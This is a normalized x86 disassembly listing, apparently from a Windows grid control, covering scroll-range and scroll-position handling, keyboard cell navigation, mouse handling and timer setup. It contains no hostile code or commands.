mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
movzx esi di
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
push eax
call GetScrollPos
cmp ebx eax
je r-xdata
test di di
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
push eax
call SetScrollPos
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x21c ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub eax ebx
mov ebx eax
mov eax 0x7f
sub eax ebx
mov ebx eax
jmp r-xdata
sub_45e948
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
call sub_43b694
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ esi ]
call sub_45cd48
mov eax [ esi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x78 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi ]
call sub_45cf80
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi ]
mov al [ eax + 0x254 ]
sub al 0x1
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x238 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x258 ]
sub eax ebx
push eax
call MulDiv
mov edx eax
xor eax eax
call sub_45e8c8
pop ecx
mov edx [ ebp - 0x5c ]
mov eax [ esi ]
call sub_45fdbc
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
call sub_4345b8
sub eax [ ebp - 0x74 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x288 ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x23c ]
mov eax [ ebp - 0x10 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x25c ]
sub eax ebx
push eax
call MulDiv
mov edx eax
mov ax 0x1
call sub_45e8c8
pop ecx
push ebp
mov edx eax
xor eax eax
call sub_45e8c8
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx eax
cmp edx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx 0x4
xor edx edx
mov eax [ esi ]
call sub_45e110
jmp r-xdata
sub_45ea94
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_45eab8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
movzx eax bx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43b390
push eax
call GetScrollRange
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
setne al
test bx bx
jne r-xdata
cmp bx 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x1
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x2
jne r-xdata
sub_45eb28
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x5c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45cdcc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45cf80
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x70 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x6c ] edx
pop ecx
pop ecx
pop ebp
retn
sub_45eba0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
call sub_45eb28
pop ecx
mov eax [ ebx ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
push 0xffffffff
push 0x0
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_43b390
push eax
call SetScrollRange
push 0xffffffff
push 0x7f
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_43b390
push eax
call SetScrollRange
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x10 ]
push eax
call sub_45ea94
pop ecx
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ edi ]
cmp eax [ ebx ]
jle r-xdata
sub_45ec1c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
sub al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x78 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff90
call sub_45eba0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_45fdbc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4345b8
sub ebx eax
test ebx ebx
jge r-xdata
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43b390
push eax
call SetScrollRange
jmp r-xdata
xor ebx ebx
sub_45ecb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
add al 0xfe
sub al 0x2
jae r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x25c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x74 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff94
call sub_45eba0
pop ecx
sub_45ecf4
push ebp
mov ebp esp
add esp 0xffffff84
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_43b694
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4345b8
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
call sub_4345fc
mov [ ebp - 0x2c ] eax
push ebp
xor eax eax
call sub_45eab8
pop ecx
test al al
je r-xdata
push ebp
mov ax 0x1
call sub_45eab8
pop ecx
test al al
je r-xdata
push 0x3
call GetSystemMetrics
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x254 ]
mov [ ebp - 0x79 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x254 ] 0x0
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_45ee02
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_45ec1c
pop ecx
mov eax [ ebp - 0x8 ]
call sub_4345fc
mov [ ebp - 0x2c ] eax
push ebp
call sub_45ecb0
pop ecx
mov eax [ ebp - 0x8 ]
call sub_4345b8
cmp eax [ ebp - 0x5c ]
je r-xdata
push 0x2
call GetSystemMetrics
add [ ebp - 0x5c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee09
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x79 ]
mov [ eax + 0x254 ] dl
retn
mov eax [ ebp - 0x8 ]
call sub_4345b8
mov [ ebp - 0x5c ] eax
push ebp
call sub_45ec1c
pop ecx
sub_45ee09
mov eax [ ebp - 0x8 ]
call sub_45e948
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0x78 ]
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x8 ]
call sub_45e848
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x25c ]
cmp eax [ ebp - 0x74 ]
je r-xdata
mov esp ebp
pop ebp
retn
sub_45ee4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43821c
or [ esi + 0x4 ] 0x10000
mov al [ ebx + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ ebx + 0x254 ]
sub al 0x1
je r-xdata
or [ esi + 0x4 ] 0x200000
or [ esi + 0x4 ] 0x100000
sub al 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x8
cmp [ ebx + 0x218 ] 0x1
jne r-xdata
or [ esi + 0x4 ] 0x800000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
jmp r-xdata
sub_45eec8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
call sub_45cd48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x25c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6c ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x68 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x6c ] 0x1
sub_45ef34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi [ eax ]
cmp ebx edi
jge r-xdata
cmp edx edi
jle r-xdata
mov [ eax ] ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ eax + 0x4 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_45ef74
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov [ ebp - 0x6d ] cl
mov ebx edx
mov [ ebp - 0x64 ] eax
lea edi [ ebp - 0x64 ]
mov edx ebx
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
call sub_43a1bc
mov [ ebp - 0x89 ] 0x0
mov dx [ ebx ]
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
mov si 0xffb1
call sub_403324
test al al
jne r-xdata
mov eax [ edi ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov [ ebx ] 0x0
or esi 0xffffffff
mov esi 0x1
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0x25
jg r-xdata
movzx eax [ ebx ]
add eax 0xffffffdf
cmp eax 0x7
ja r-xdata
mov eax [ edi ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x80 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x7c ] edx
mov eax [ edi ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
push ebp
call sub_45eec8
pop ecx
test [ ebp - 0x6d ] 0x4
je r-xdata
sub eax 0x26
je r-xdata
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x88 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0x88 ]
mov eax [ edi ]
call sub_45cf80
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x84 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x78 ]
call sub_45ef34
mov edx [ edi ]
mov edx [ edx + 0x258 ]
mov eax [ ebp - 0x78 ]
cmp edx eax
jne r-xdata
jmp [ eax * 4 + jump_table_45f020 ]
dec [ ebp - 0x7c ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
cmp eax 0x22
jg r-xdata
mov ecx [ ebp - 0x74 ]
mov edx eax
mov eax [ edi ]
call sub_45e50c
mov edx [ edi ]
mov edx [ edx + 0x25c ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec [ ebp - 0x74 ]
jmp r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x25c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403324
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403324
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
sub [ ebp - 0x80 ] esi
jmp r-xdata
sub [ ebp - 0x7c ] esi
jmp r-xdata
sub eax 0x23
je r-xdata
je r-xdata
test [ ebp - 0x6d ] 0x1
setne dl
xor dl 0x1
push edx
mov ecx [ ebp - 0x7c ]
mov edx eax
mov eax [ edi ]
call sub_45da0c
mov edx [ edi ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x7c ]
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
push eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x80 ]
call sub_45ef34
mov edx [ edi ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x80 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x68 ]
imul esi
sub [ ebp - 0x80 ] eax
sub [ ebp - 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
imul esi
add [ ebp - 0x80 ] eax
add [ ebp - 0x78 ] eax
jmp r-xdata
add [ ebp - 0x80 ] esi
jmp r-xdata
add [ ebp - 0x7c ] esi
jmp r-xdata
inc [ ebp - 0x7c ]
jmp r-xdata
sub eax 0x49
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
add [ ebp - 0x74 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x89 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ edi ]
call sub_460144
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
jmp r-xdata
test [ ebp - 0x6d ] 0x2
jne r-xdata
sub eax 0x18
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
test [ ebp - 0x6d ] 0x1
je r-xdata
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x74 ] eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x21c ]
cmp eax [ ebp - 0x80 ]
jg r-xdata
dec [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x80 ]
jle r-xdata
mov edx [ ebp - 0x80 ]
mov eax [ edi ]
call sub_45fe18
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
inc [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0x7c ]
jg r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x6d ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
dec [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x7c ]
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_45f3e1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a374
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
cmp [ ebx + 0x28d ] 0x0
je r-xdata
mov eax ebx
call sub_45bc94
mov eax ebx
call sub_45bc84
jmp r-xdata
mov [ esi ] 0x0
sub_45f420
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_46030c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb8
call sub_403324
test al al
jne r-xdata
test bl bl
jne r-xdata
test [ ebp - 0x5 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
call sub_45bc04
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c6fc
test eax eax
jne r-xdata
xor eax eax
push ebp
push j_sub_4035c8
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x5 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_45cd48
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
add eax 0x260
push eax
mov eax [ ebp - 0x4 ]
add eax 0x264
push eax
mov eax [ ebp - 0x4 ]
add eax 0x268
push eax
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403324
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_434dec
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45ccec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov esi [ ebp - 0x10 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_45d73c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4345b8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetTimer
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x10 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45e3b4
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e32c
jmp r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45e3b4
mov eax [ ebp - 0x4 ]
call sub_4603e8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_41245c
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa2
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc94
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_41245c
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa3
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_45d87c
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetTimer
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403324
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_45d87c
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetTimer
sub_45f7ec
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_45cd48
mov al [ ebx + 0x28e ]
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45ccec
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x238 ]
jl r-xdata
dec eax
sub al 0x2
jb r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_436428
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x23c ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_45d73c
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x60 ]
inc eax
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebx + 0x268 ]
add eax esi
mov [ ebx + 0x264 ] eax
mov eax [ ebx + 0x268 ]
add eax edi
mov [ ebx + 0x264 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
cmp eax [ ebp - 0x8 ]
jl r-xdata
